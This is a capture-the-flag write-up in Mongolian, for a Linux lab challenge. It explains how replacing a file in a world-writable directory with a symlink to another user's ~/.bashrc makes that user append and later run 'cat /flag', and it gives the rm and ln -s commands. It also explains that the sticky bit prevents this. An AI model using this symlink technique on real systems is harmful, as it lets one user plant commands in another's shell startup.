# Tricky Linking

> Module: **Linux Luminarium / Silly Shenanigans** · Challenge: `tricky-linking`

Зардус world-writable `/tmp/collab/evil-commands.txt`-д `cat /flag` нэмдэг тул тэр файлыг зардусын `~/.bashrc` руу заасан symbolic link-ээр орлуулж, дараагийн нэвтрэлтэд флагийг гаргуулна.

## Тайлбар

- Зардус `.bashrc`-ээ хуваалцахаа больж `/tmp/collab`-ийг world-writable болгоод evil commands жагсаалт эхлүүлсэн. `/challenge/victim` ажиллуулбал зардус `echo "cat /flag" >> /tmp/collab/evil-commands.txt` гэж нэмнэ.
- Директорт бичих эрхтэй бол (`/tmp/collab`) би `evil-commands.txt`-ийг устгаад солиж чадна. Comprehending Commands-аас: файлыг өөр файл руу link хийж болно.
- Хэрэв `evil-commands.txt`-ийг зардусын бичиж чадах эмзэг файл (`~/.bashrc`) руу заасан **symlink**-ээр солибол, зардусын `>>` бичилт нь жинхэнэ файлын оронд `.bashrc`-д `cat /flag` нэмнэ. Дараагийн нэвтрэлтэд `.bashrc` дуудагдаж флаг гарна.
- Тиймээс `/challenge/victim`-ийг **хоёр удаа** ажиллуулна: нэг нь `cat /flag`-ийг хүссэн газраа (`.bashrc`) бичүүлэх, нөгөө нь түүнийг ажиллуулж флаг барих.
- Хамгаалалт: `/tmp` дээрх `t` (sticky bit, `drwxrwxrwt`) нь файлын эзэн л зөөх/устгахыг зөвшөөрдөг тул яг ийм халдлагаас сэргийлдэг. Зардус `/tmp/collab`-д `chmod +t` хийгээгүй нь эмзэг байдал үүсгэсэн.

## Solution

```console
# 1) evil-commands.txt-ийг zardus-ын .bashrc руу заасан symlink-ээр орлуулна
hacker@shenanigans~tricky-linking:~$ rm /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt

# 2) Эхний victim: zardus "cat /flag"-ийг .bashrc-д (symlink-ээр) нэмнэ
hacker@shenanigans~tricky-linking:~$ /challenge/victim

# 3) Хоёр дахь victim: .bashrc дуудагдаж cat /flag ажиллана
hacker@shenanigans~tricky-linking:~$ /challenge/victim
```

## Flag

```
(флаг хараахан барьж аваагүй — дээрх алхмуудыг гүйцэтгэсний дараа энд нэмнэ)
```
